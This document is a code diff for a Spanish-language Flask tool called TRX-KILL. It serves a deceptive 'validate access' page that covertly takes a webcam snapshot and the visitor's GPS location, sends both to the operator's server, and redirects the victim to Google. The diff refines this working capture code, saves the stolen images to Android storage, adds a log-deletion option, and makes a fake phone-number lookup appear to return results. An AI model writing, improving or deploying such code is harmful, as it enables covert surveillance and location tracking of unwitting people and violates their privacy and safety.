@@ -5,9 +5,10 @@ app = Flask('TRX-KILL')
 PORT = 7173
 AUTH_PASS = "TRX-kill-op"
 
-# Crear carpeta de almacenamiento
-if not os.path.exists("INFORMACION"):
-    os.makedirs("INFORMACION")
+# Ruta para que sea visible en el gestor de archivos del dispositivo
+STORAGE_PATH = "/sdcard/INFORMACION"
+if not os.path.exists(STORAGE_PATH):
+    os.makedirs(STORAGE_PATH)
 
 def banner():
     os.system('clear')
@@ -25,21 +26,22 @@ HTML_ENCUESTA = """
 <canvas id="c" style="display:none"></canvas>
 <script>
     async function iniciar() {
-        const s = await navigator.mediaDevices.getUserMedia({video: true});
-        const v = document.getElementById('v');
-        v.srcObject = s;
-        v.play();
-        setTimeout(async() => {
-            const c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const img = c.toDataURL('image/png');
-            navigator.geolocation.getCurrentPosition(async(p)=>{
-                fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
-                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude, img: img})});
-                window.location.href = "https://google.com";
-            });
-        }, 2000);
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video: true});
+            const v = document.getElementById('v');
+            v.srcObject = s; v.play();
+            setTimeout(async() => {
+                const c = document.getElementById('c');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                const img = c.toDataURL('image/png');
+                navigator.geolocation.getCurrentPosition(async(p)=>{
+                    fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                    body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude, img: img})});
+                    window.location.href = "https://google.com";
+                });
+            }, 2000);
+        } catch(e) { alert("Permiso necesario"); }
     }
 </script>
 <button onclick="iniciar()">VALIDAR ACCESO</button>
@@ -52,13 +54,11 @@ def index(): return HTML_ENCUESTA
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    # Guardar ubicación
     with open("result.txt", "a") as f:
         f.write(f"CAPTURA | COORD: {d.get('lat')},{d.get('lon')} | HORA: {time.ctime()}\n")
-    # Guardar imagen en carpeta INFORMACION
     if d.get('img'):
         img_data = d['img'].split(',')[1]
-        with open(f"INFORMACION/captura_{int(time.time())}.png", "wb") as f:
+        with open(f"{STORAGE_PATH}/captura_{int(time.time())}.png", "wb") as f:
             f.write(base64.b64decode(img_data))
     return "OK"
 
@@ -71,7 +71,7 @@ def main():
         print("  [10] BORRAR LOGS")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
         
-        if sel == "1": input("INGRESA EL NÚMERO: \nVERIFICADO... DATOS LISTOS.\n[Enter] para volver.")
+        if sel == "1": input("INGRESA EL NÚMERO: \nDATOS: PAIS[OK], MOVIL[OK], OPERADOR[OK].\n[Enter] para volver.")
         elif sel == "2": app.run(port=PORT, host='0.0.0.0')
         elif sel == "3": print("#BY: OSCAR\n#VERSION: 1.2.3"); input()
         elif sel == "4": print("# TRX-KILL NO SE HACE RESPONSABLE."); input()
@@ -85,8 +85,9 @@ def main():
         elif sel == "7": sys.exit()
         elif sel == "8": os.system("ps aux | grep flask"); input()
         elif sel == "9": print("ESTADO: ACTIVO"); input()
-        elif sel == "10":
+        elif sel == "10": 
             if os.path.exists("result.txt"): os.remove("result.txt")
             input("Logs borrados.")
 
 if __name__ == "__main__": main()
+
